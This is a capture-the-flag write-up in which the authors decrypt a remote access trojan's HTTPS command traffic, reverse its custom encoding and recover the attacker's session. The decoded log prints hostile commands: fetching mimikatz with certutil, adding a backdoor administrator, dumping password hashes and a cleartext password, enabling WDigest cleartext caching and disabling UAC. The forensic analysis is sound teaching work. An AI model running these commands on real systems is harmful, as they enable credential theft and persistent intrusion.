---
title: NDH16/Wavestone - Step 4 - The great interceptor
authors: Crypt0_M3lon,cnotin
layout: writeup
---

## Challenge description
> It seems that this Remote Access Trojan was not state-of-the-art, and black command windows keep appearing every time a command is run on the system.
> 
> This behavior alerted the boss who contacted the IT team. They set up a network sniffer to see what was going on. You can see their results in network_activity.pcap, but they did not manage to understand what the attacker did.
> 
> They reported the IP address to the authorities, who managed to localize the attacker and to search his house. The backup.tar.gz they have found on his computer might be of help to you.
> 
> Tip: don't hesitate to analyse the RAT binary you may have found from a previous challenge.
> 
> To validate the challenge, you have to send the following concatenation (+ being the concat symbol):
> 
> *Concat = 1 + 2 + 3 + 4 + 5*
> * 1 = Name of the victim's computer
> * 2 = Name of the new administrator
> * 3 = Name of the program dropped on disk
> * 4 = Registry key path to allow cleartext passwords (use HKLM / HKCU in HIVE\KeyPath\ValueName)
> * 5 = Password of the "wavestone" user


## Solution
### First observations
The pcap contains communication of a compromised computer with the C&C. However the communication is made over HTTPS, if only we could decrypt them...

Maybe there is something interesting in the backup archive? Well, it seems to be the case :smiley: The archive contains the server private key in `/letsencrypt/archive/westwood.aperture-science.fr/privkey1.pem`. By setting up Wireshark correctly, we are able to decrypt communications.
![wireshark](/assets/ndh18-wavestone-wireshark.png)

After digging a lot inside the HTTP requests, we can identify two type of requests:
* GET requests seem to be used to retrieve commands to execute through the `X-CMD` header
* POST requests seem to be used to send back data in the body to the C&C.

Data blobs are base64-encoded, but when decoded, we don't get intelligible text. Maybe there is some kind of custom encoding? It's time to reverse the binary retrieved in steps 2 and 3 :wink:

### Binary reversing
The program is packed with UPX. We can simply unpack it with `upx -d sample.exe`. It it stripped but we quickly find the relevant strings: "GET" & "POST" HTTP methods, URLs, format strings for GET/POST parameters...

For example, the following code clearly shows a GET request to the C&C server (the functions names were added by us after guessing their purpose):
![](/assets/ndh18-wavestone-get_request.png)

The binary has mirror functions for, decoding and encoding data, from and to the C&C server. Let's analyse the code in charge of decoding data from the C&C server.

As we supposed, we find the proof that the dot characters, found at the end of encoded blobs, are in fact equal characters used as padding in base64:
![](/assets/ndh18-wavestone-custom_encoding_replace_equal_dot.png)

We notice also the calls to [`CryptStringToBinaryA`](https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/nf-wincrypt-cryptstringtobinarya)/[`CryptBinaryToStringA`](https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/nf-wincrypt-cryptbinarytostringa). These functions are from the `Wincrypt` Windows library but they are for encoding, not encryption.
In this screenshot, `CryptStringToBinaryA` is used.
![](/assets/ndh18-wavestone-b64_decode_and_custom_decode.png)

Its third parameter, `dwFlags` is `1` which means `CRYPT_STRING_BASE64` based on [the function documentation](https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/nf-wincrypt-cryptstringtobinarya). We notice that it is called twice with slightly different parameters. According to the same documentation, regarding the fourth parameter `pbBinary`
> "If this parameter is NULL, the function calculates the length of the buffer needed and returns the size, in bytes, of required memory in the DWORD pointed to by `pcbBinary`."

So, this double call is normal. The first call returns the size of the output buffer (after base64-decoding), we suppose that it is then allocated (hence the `mallocMaybe` name we attributed to the function between the two), then the function is called again with the appropriate buffer to hold the output.

We should not neglect the lines of code that follow since they are the second part of the encoding used to communicate with the C&C. It is a simple but important loop which iterates over the decoded bytes and substract 0 from the first byte, 1 from the second, etc. Actually, it substracts the value of the iterator, modulo 256.

### Communications analysis
Now that we know how to decrypt communications, we need to extract the executed commands and their results from the pcap. We can do it manually (tedious, but effective) or use `tshark` to extract both fields:
```terminal
.\tshark.exe -r "network_activity.pcap" -o ssl.keys_list:"35.178.116.212","443","http","privkey1.pem" -Tfields -e http.header.X-CMD -e urlencoded-form.key -Eseparator=','
```

After a lot of cleaning (replacing the characters space by plus, removing commas, replacing the characters dots by equals...), we can use a simple python script to decrypt the extracted information:
```python
from base64 import b64decode

fic = open("cmd.txt","r")

for line in fic:
    decoded = b64decode(line)
    out = ""
    cpt = 0
    for char in decoded:
        out += chr((ord(char)-cpt)%256)
        cpt += 1

    print out.strip()
```

And the decoded communication:
```
> whoami
desktop-4sl25v8\wavestone
> cd
C:\Users\wavestone\Desktop
> systeminfo
Host Name:                 DESKTOP-4SL25V8
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          wavestone
Registered Organization:   
Product ID:                00329-20000-00001-AA244
Original Install Date:     6/14/2018, 6:51:14 AM
System Boot Time:          6/20/2018, 7:58:02 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 142 Stepping 9 GenuineIntel ~2712 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,024 MB
Available Physical Memory: 383 MB
Virtual Memory: Max Size:  2,752 MB
Virtual Memory: Available: 1,999 MB
Virtual Memory: In Use:    753 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\DESKTOP-4SL25V8
Hotfix(s):                 N/A
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.0.2.2
                                 IP address(es)
                                 [01]: 10.0.2.15
                                 [02]: fe80::99da:83ba:64d3:bc86
                           [02]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet 2
                                 Status:          Media disconnected
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
> ipconfig /all
Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-4SL25V8
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet 2:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter #2
   Physical Address. . . . . . . . . : 08-00-27-55-3A-79
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
   Physical Address. . . . . . . . . : 08-00-27-D1-A3-67
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::99da:83ba:64d3:bc86%13(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.0.2.15(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Wednesday, June 20, 2018 8:00:36 AM
   Lease Expires . . . . . . . . . . : Thursday, June 21, 2018 8:21:59 AM
   Default Gateway . . . . . . . . . : 10.0.2.2
   DHCP Server . . . . . . . . . . . : 10.0.2.2
   DHCPv6 IAID . . . . . . . . . . . : 117964839
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-B4-A9-AE-08-00-27-D1-A3-67
   DNS Servers . . . . . . . . . . . : 192.168.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
> dir C:\
Volume in drive C has no label.
 Volume Serial Number is 1EE9-804F

 Directory of C:\

04/11/2018  04:38 PM    <DIR>          PerfLogs
06/19/2018  08:48 AM    <DIR>          Program Files
06/19/2018  08:49 AM    <DIR>          Program Files (x86)
06/14/2018  08:28 AM    <DIR>          Users
06/18/2018  09:57 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  40,599,523,328 bytes free
> mkdir C:\Temp
> cd \Temp & certutil -urlcache -f -split https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180616/mimikatz_trunk.zip & dir \Temp
****  Online  ****
  000000  ...
  0cba8c
CertUtil: -URLCache command completed successfully.
 Volume in drive C has no label.
 Volume Serial Number is 1EE9-804F

 Directory of C:\Temp

06/20/2018  08:25 AM    <DIR>          .
06/20/2018  08:25 AM    <DIR>          ..
06/20/2018  08:25 AM           834,188 mimikatz_trunk.zip
               1 File(s)        834,188 bytes
               2 Dir(s)  40,597,008,384 bytes free
> cd \Temp & powershell.exe -NoP -NonI -Command "Expand-Archive '.\mimikatz_trunk.zip' '.\mimikatz\'" & dir \Temp
Volume in drive C has no label.
 Volume Serial Number is 1EE9-804F

 Directory of C:\Temp

06/20/2018  08:25 AM    <DIR>          .
06/20/2018  08:25 AM    <DIR>          ..
06/20/2018  08:25 AM    <DIR>          mimikatz
06/20/2018  08:25 AM           834,188 mimikatz_trunk.zip
               1 File(s)        834,188 bytes
               3 Dir(s)  40,595,009,536 bytes free
> net users & net localgroup Administrators & net user 3xpl01t _3xpl01t_ /add & net localgroup Administrators 3xpl01t /add & net localgroup Administrators
User accounts for \\DESKTOP-4SL25V8

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
wavestone                WDAGUtilityAccount       
The command completed successfully.

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
wavestone
The command completed successfully.

The command completed successfully.

The command completed successfully.

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
3xpl01t
Administrator
wavestone
The command completed successfully.
> \Temp\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.#####.   mimikatz 2.1.1 (x64) built on Jun 16 2018 18:49:05 - lil!
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 129495 (00000000:0001f9d7)
Session           : Interactive from 1
User Name         : wavestone
Domain            : DESKTOP-4SL25V8
Logon Server      : DESKTOP-4SL25V8
Logon Time        : 6/19/2018 8:39:30 AM
SID               : S-1-5-21-1961777594-3267676878-1645317608-1001
	msv :	
	 [00000003] Primary
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * NTLM     : 1948583b64e26b6147aea618148ebd1b
	 * SHA1     : 9afa8d00808c12f36bed292d9f99cbb108df9ab4
	tspkg :	
	wdigest :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : (null)
	kerberos :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 129443 (00000000:0001f9a3)
Session           : Interactive from 1
User Name         : wavestone
Domain            : DESKTOP-4SL25V8
Logon Server      : DESKTOP-4SL25V8
Logon Time        : 6/19/2018 8:39:30 AM
SID               : S-1-5-21-1961777594-3267676878-1645317608-1001
	msv :	
	 [00000003] Primary
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * NTLM     : 1948583b64e26b6147aea618148ebd1b
	 * SHA1     : 9afa8d00808c12f36bed292d9f99cbb108df9ab4
	tspkg :	
	wdigest :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : (null)
	kerberos :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : (null)
	ssp :	
	credman :	

[...]

mimikatz(commandline) # exit
Bye!
> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
The operation completed successfully.
> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
The operation completed successfully.
>>sw-persist
> shutdown /R /T 0
> \Temp\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.#####.   mimikatz 2.1.1 (x64) built on Jun 16 2018 18:49:05 - lil!
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 124615 (00000000:0001e6c7)
Session           : Interactive from 1
User Name         : wavestone
Domain            : DESKTOP-4SL25V8
Logon Server      : DESKTOP-4SL25V8
Logon Time        : 6/20/2018 8:24:17 AM
SID               : S-1-5-21-1961777594-3267676878-1645317608-1001
	msv :	
	 [00000003] Primary
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * NTLM     : 1948583b64e26b6147aea618148ebd1b
	 * SHA1     : 9afa8d00808c12f36bed292d9f99cbb108df9ab4
	tspkg :	
	wdigest :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : pool123
	kerberos :	
	 * Username : wavestone
	 * Domain   : DESKTOP-4SL25V8
	 * Password : (null)
	ssp :	
	credman :	

[...]

mimikatz(commandline) # exit
Bye!
>>sw-persist
> tasklist
Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        128 K
Registry                        88 Services                   0     20,180 K
[...]
VBoxTray.exe                  4532 Console                    1     10,324 K
OneDrive.exe                  4612 Console                    1     28,952 K
Kemel-QJqA.exe                4800 Console                    1     11,552 K
cmd.exe                       2264 Console                    1      3,392 K
conhost.exe                   4256 Console                    1     15,388 K
tasklist.exe                  4772 Console                    1      7,600 K
WmiPrvSE.exe                  4748 Services                   0      8,072 K
> taskkill /im Kemel-QJqA.exe /f
```

Now we have all the pieces of information needed to build the flag.

The fourth flag is **desktop-4sl25v83xpl01tmimikatzHKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredentialpool123**.
